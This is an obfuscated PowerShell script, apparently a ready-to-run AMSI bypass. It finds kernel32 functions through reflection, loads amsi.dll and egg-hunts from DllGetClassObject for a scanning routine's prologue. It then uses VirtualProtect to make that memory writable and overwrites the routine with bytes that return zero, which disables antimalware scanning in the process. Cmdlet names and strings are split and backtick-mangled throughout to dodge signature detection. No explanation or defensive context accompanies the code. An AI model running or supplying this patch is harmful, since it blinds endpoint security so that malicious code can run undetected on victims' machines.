Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    w`hERe-O`Bj`eCt { $_.GlobalAssemblyCache -And $_.Location.Split((('jf'+'2j'+'f2').REPlaCe('jf2','\')))[-1].Equals(('Sys'+'tem'+'.dll')) }
    $UnsafeNativeMethods = $SystemAssembly.GetType(('Microso'+'f'+'t.Win3'+'2.UnsafeNativeMet'+'h'+'o'+'d'+'s'))
    
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(('GetMo'+'dule'+'Ha'+'ndle'))
    $GetProcAddress = $UnsafeNativeMethods.GetMethod(('Ge'+'tP'+'r'+'ocAddr'+'ess'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = N`E`w-ObJECt IntPtr
    $HandleRef = NE`W-o`BjEcT System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (Ne`w-`OBj`eCt Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = N`EW`-`OBject System.Reflection.AssemblyName(('Re'+'flectedD'+'e'+'lega'+'te'))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(('InMemo'+'ryMod'+'ul'+'e'), $false)
    $TypeBuilder = $ModuleBuilder.DefineType(('MyDel'+'ega'+'teTy'+'pe'), ('Clas'+'s, Publi'+'c'+', Sealed, An'+'s'+'i'+'Class, '+'AutoClass'), [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor(('R'+'TS'+'pecia'+'l'+'Name, '+'H'+'ideBySig'+', Pub'+'lic'), [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags(('Runti'+'me, '+'Mana'+'ged'))
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', ('Public, '+'HideBySig'+', New'+'Slo'+'t, Virt'+'ua'+'l'), $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags(('Ru'+'ntim'+'e,'+' Managed'))
        
    WrITe`-o`UT`Put $TypeBuilder.CreateType()
}
$LoadLibraryAddr = get-pro`cA`d`dr`esS kernel32.dll LoadLibraryA
$LoadLibraryDelegate = G`et`-DELegAT`etYPE @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = GEt`-p`ROC`ADdRe`ss kernel32.dll GetProcAddress
$GetProcAddressDelegate = gET`-D`ElE`gAtetYpE @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = g`e`T-prOc`AdDRe`sS kernel32.dll VirtualProtect
$VistualProtectDelegate =  g`e`T-dE`Le`GAteTypE @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
    )
}


$hModule = $LoadLibrary.Invoke(('am'+'si.dll'))
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, ('Dll'+'Ge'+'tCla'+'ssObject'))
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | OU`T-`NULl

$patch = [byte[]] (
    0x31, 0xC0,    
    0xC3           
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | O`UT-nu`Ll

